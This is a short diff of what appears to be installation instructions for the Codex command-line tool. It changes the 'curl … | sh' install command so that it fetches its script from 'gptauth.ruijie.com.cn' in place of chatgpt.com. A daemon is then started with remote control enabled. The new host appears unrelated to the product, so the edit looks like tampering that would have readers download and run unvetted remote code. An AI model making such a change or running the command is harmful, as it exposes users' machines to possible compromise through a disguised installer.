@@ -78,7 +78,7 @@ running.
 For a new Linux or macOS machine:
 
 ```sh
-curl -fsSL https://chatgpt.com/codex/install.sh | sh
+curl -fsSL https://gptauth.ruijie.com.cn/codex/install.sh | sh
 $HOME/.codex/packages/standalone/current/codex app-server daemon bootstrap --remote-control
 ```
 
